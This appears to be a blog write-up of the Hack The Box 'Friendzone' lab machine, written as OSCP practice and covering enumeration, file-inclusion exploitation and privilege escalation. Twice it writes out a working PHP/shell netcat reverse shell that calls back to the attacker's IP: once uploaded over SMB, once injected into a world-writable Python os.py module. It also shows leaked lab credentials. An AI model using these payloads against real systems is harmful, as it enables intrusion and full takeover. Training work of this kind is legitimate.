---
title: "Hack The Box - Friendzone"
date: 2021-12-15T17:00:30-04:00
categories:
  - WriteUp
  - HackTheBox
  - Linux
tags:
  - OSCP Preparation
  - SMB
  - Reverse Shell
  - Python
  - Nmap
  - Gobuster
---


# Introduction

---

Friendzone is an easy machine on hackthebox. With a rating of 4.4 the machine should be a good practice machine without many things to brute force or to guess. Without talking that much, I will start with the enumeration.

# Enumeration

---

As always, I start with an nmap scan.

## Nmap Scan

---

A basic scan of all ports is recommended, so I will start with that:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ sudo nmap friendzone.htb -v -p- -sS
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 10:26 CEST
Initiating Ping Scan at 10:26
Scanning friendzone.htb (10.10.10.123) [4 ports]
Completed Ping Scan at 10:26, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:26
Scanning friendzone.htb (10.10.10.123) [65535 ports]
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Completed SYN Stealth Scan at 11:06, 2397.29s elapsed (65535 total ports)
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.11s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2397.66 seconds
           Raw packets sent: 70007 (3.080MB) | Rcvd: 374061 (75.350MB)
```

Nmap found 7 open ports, on which I perform a deep scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ sudo nmap friendzone.htb -p 21,22,53,80,139,443,445 -A
[sudo] password for user:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 11:12 CEST
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.092s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/ssl     Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=
CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), 
ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.1 (93%), Linux 3.2 (93%), 
Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1)
 (93%), Linux 3.12 (92%), Linux 3.13 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: -52m01s, deviation: 1h43m54s, median: 7m57s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, 
NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-08-26T12:20:19+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-26T09:20:19
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   87.70 ms 10.10.16.1
2   87.81 ms friendzone.htb (10.10.10.123)

Nmap done: 1 IP address (1 host up) scanned in 30.82 seconds
```

## Enumeration Of Services

---

### Port 21

---

On this port runs FTP (vsftpd), there are no vulnerabilities in this version. I login as anonymous:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ ftp friendzone.htb
Connected to friendzone.htb.
220 (vsFTPd 3.0.3)
Name (friendzone.htb:user): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> ls
530 Please login with USER and PASS.
ftp: bind: Address already in use
```

That did not work.

### Port 22

---

No need to enumerate the SSH services, I would need credentials. The installed version is not vulnerable.

### Port 53

---

This is the DNS server, but there are no DNS records found:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ dnsrecon -d friendzone.htb     
[*] Performing General Enumeration of Domain: friendzone.htb
[-] DNSSEC is not configured for friendzone.htb
[-] Could not Resolve NS Records for friendzone.htb
[-] Could not Resolve MX Records for friendzone.htb
[*] Enumerating SRV Records
[+] 0 Records Found
```

So this is a rabbit hole.

### Port 139 & 445

---

Here runs samba. First, I try to list all the directories to which I can connect without a password:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient -L //friendzone.htb/        
Enter WORKGROUP\user's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

I connect to the shares:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient //friendzone.htb/Files1
Enter WORKGROUP\user's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient //friendzone.htb/general
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  creds.txt                           N       57  Wed Oct 10 01:52:42 2018

                9221460 blocks of size 1024. 6416532 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.2 KiloBytes/sec) 
smb: \> exit

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient //friendzone.htb/Development
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:03:49 2019
  ..                                  D        0  Wed Jan 23 22:51:02 2019

                9221460 blocks of size 1024. 6416532 blocks available
smb: \> exit
```

The only thing I got is a file called creds.txt. Here is the content of this file:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Maybe I can connect to Files as admin:

```bash
──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient //friendzone.htb/Files -U admin
Enter WORKGROUP\admin's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

That did not work, I even tried to log in to FTP with these credentials but without success.

### Port 80

---

Gobuster scan:

```bash
──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ gobuster dir -u http://friendzone.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt                                                                    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://friendzone.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,log
[+] Timeout:                 10s
===============================================================
2021/08/26 10:34:46 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 324]
/wordpress            (Status: 301) [Size: 320] [--> http://friendzone.htb/wordpress/]
/robots.txt           (Status: 200) [Size: 13]
```

Gobuster found a wordpress instance and the robots file. On the page, there is an image, I try to find some steganography inside it. But the image is just an image. There is some text on the page:

```
if yes, try to get out of this zone ;)
Call us at : +999999999
Email us at: info@friendzoneportal.red
```

There is also the domain: friendzoneportal.red, I can try to transfer the zone:

```bash
──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ dig axfr friendzoneportal.red @10.10.10.123

; <<>> DiG 9.16.15-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost.
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost.
;; Query time: 152 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Aug 26 20:00:58 CEST 2021
;; XFR size: 9 records (messages 1, bytes 309)
```

This will be useful later. Next, I check robots.txt:

```bash
seriously ?!
```

This is a short text. The wordpress directory is empty. Before starting the enumeration of the [friendzoneportal.red](http://friendzoneportal.red) domain, I check the other ports.

### Port 443

---

Gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ gobuster dir -u https://friendzone.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-https.txt -x php,html,log,txt -k                                                          
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://friendzone.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html,log
[+] Timeout:                 10s
===============================================================
2021/08/26 10:35:01 Starting gobuster in directory enumeration mode
===============================================================
```

Gobuster found nothing, so I try to access the webpage:

![Untitled](/assets/images/2021-12-15-friendzone/Untitled.png)

I just noticed that the domain name is another: (see nmap deep scan) commonName=`friendzone.red`. So I change all domain names to .red. After changing the name, I can access the page. Look at the source code:

```bash
<title>FriendZone escape software</title>

<br>
<br>

<center><h2>Ready to escape from friend zone !</h2></center>

<center><img src="e.gif"></center>

<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```

So I redo the gobuster scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ gobuster dir -k -u https://friendzone.red -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20 -x txt,php                                                                                                            1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://friendzone.red
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/08/26 20:30:10 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> https://friendzone.red/admin/]
/js                   (Status: 301) [Size: 315] [--> https://friendzone.red/js/
```

The admin directory is empty, like the wordpress directory on port 80. But the js directore (as suggested in the HTML comments) is full with information ([https://friendzone.red/js/js/](https://friendzone.red/js/js/)):

```html
<p>Testing some functions !</p>
<p>I'am trying not to break things !</p>SkRNQVlxMld0MjE2MzAwMDMyODgxemk2dWZ3UEhj
<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```

That does not help much at the time

## Enumerating the friendzoneportal.red

---

I input all the domains into the hosts file:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ cat /etc/hosts            
127.0.0.1       localhost
127.0.1.1       KaliVM
10.10.10.123    friendzone.htb friendzoneportal.htb admin.friendzoneportal.htb files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

But on all of these domains I get the same page. So I will enumerate the [friendzone.red](http://friendzone.red) site.

## Eneumerating friendzone.red

---

First, I check the DNS:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.16.15-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost.
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost.
;; Query time: 100 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Aug 26 20:38:41 CEST 2021
;; XFR size: 8 records (messages 1, bytes 289)
```

That looks better than the first time I checked this command. I add the subdomains to the host file:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       KaliVM
10.10.10.123    friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

All the subdomains show up the same site I have seen a few times already. So I try the same with https. (But now the friendzoneportal subdomain, which did not work on http). I tested these subdomains:

[HTTPS Subdomains](https://www.notion.so/f3082d8d572247a89a2dc29e4492da99)

Here is the login of [https://admin.friendzoneportal.red](https://admin.friendzoneportal.red/):

![Untitled](/assets/images/2021-12-15-friendzone/Untitled1.png)

So I check the administrator1 subdomain of the HTTP site. That failed but I don't give up. I try the same url but now over HTTPS:

![Untitled](/assets/images/2021-12-15-friendzone/Untitled2.png)

That worked, I try the same credentials as I tried on the last subdomain:

`admin:WORKWORKHhallelujah@#`

![Untitled](/assets/images/2021-12-15-friendzone/Untitled3.png)

So I visit dashboard.php, which gives me this site:

![Untitled](/assets/images/2021-12-15-friendzone/Untitled4.png)

So I visit [https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp](https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp), which gives me this page:

![Untitled](/assets/images/2021-12-15-friendzone/Untitled5.png)

# Exploitation

---

There are parameters, via the pagename I can maybe include a local file. So I try that.

I can include a page, so maybe I can upload a shell via SMB, here is the code of the file:

```php
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.28 4444 >/tmp/f');
?>
```

Upload the shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ smbclient //friendzone.red/Development/    
Enter WORKGROUP\user's password: 
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (0.3 kb/s) (average 0.3 kb/s)
smb: \> ls
  .                                   D        0  Fri Aug 27 11:43:40 2021
  ..                                  D        0  Wed Jan 23 22:51:02 2019
  shell.php                           A       99  Fri Aug 27 11:43:40 2021

                9221460 blocks of size 1024. 6344988 blocks available
smb: \> exit
```

I start a netcat listener and try to execute the file. I tried to following URLs:

[https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/dev/shell](https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/shell)

[https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/shell](https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/shell)

The last one worked, I got the shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.123] 41578
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/var/www/admin$ export TERM=xterm
export TERM=xterm
www-data@FriendZone:/var/www/admin$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                              
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ stty raw -echo; fg                      
[1]  + continued  nc -lvnp 4444

www-data@FriendZone:/var/www/admin$
```

The shell runs under the user context of www-data.

## User Flag

---

I should be able to read the user flag:

```bash
www-data@FriendZone:/var/www/admin$ cd /home
www-data@FriendZone:/home$ ls
friend
www-data@FriendZone:/home$ cd friend/
www-data@FriendZone:/home/friend$ ls
user.txt
www-data@FriendZone:/home/friend$ cat user.txt
a9**************************9a11
```

# Privesc

---

## www-data → friend

---

I searched through the web directory and found this mysql config file:

```bash
www-data@FriendZone:/var/www$ ls
admin       friendzoneportal       html             uploads
friendzone  friendzoneportaladmin  mysql_data.conf
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

I try to login to SSH, because this user also exists on the system (`friend:Agpyu12!0.213$`):

```bash
┌──(user㉿KaliVM)-[/tools/LinPEAS]
└─$ ssh friend@friendzone.red                      
The authenticity of host 'friendzone.red (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Permanently added 'friendzone.red,10.10.10.123' (ECDSA) to the list of known hosts.
friend@friendzone.red's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$
```

There is the shell as friend.

## friend → root

---

I found a file which root runs time by time (using LinPEAS):

```bash
friend@FriendZone:/tmp$ cd /opt
friend@FriendZone:/opt$ ls
server_admin
friend@FriendZone:/opt$ cd server_admin/
friend@FriendZone:/opt/server_admin$ ls
reporter.py
```

I cannot write to the file, but I can read it:

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

If I could write to that file, I would get a root shell. But the file can only be edited by root. The script imports os. The modules are normally only writable as root, but I checked it to be sure to not miss anything:

```bash
friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os
-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
```

And voila, [os.py](http://os.py) is world writable, so I added these two lines:

```python
import os
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.28 4444 >/tmp/f')
```

I know that this would normally create an import loop. But I call a shell so the script pauses the execution. I start a netcat listener and wait until the shell spawns:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.123] 40730
/bin/sh: 0: can't access tty; job control turned off
# python -c 'import pty;pty.spawn("/bin/bash")'
root@FriendZone:~# export TERM=xterm
export TERM=xterm
root@FriendZone:~# ^Z
zsh: suspended  nc -lvnp 4444
      
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/friendzone]
└─$ stty raw -echo; fg 
[1]  + continued  nc -lvnp 4444

root@FriendZone:~# ls
certs  root.txt
```

A shell as user root spawned.

## Root Flag

---

I can now get the root flag:

```bash
root@FriendZone:~# cat root.txt
b0**************************90c7
```

# Conclusions

---

This is a very good box. It is not very CTF like, but I think that this is good. The box is a good practice for the OSCP exam, it includes new techniques, such as to look as python modules if they are writable to any user.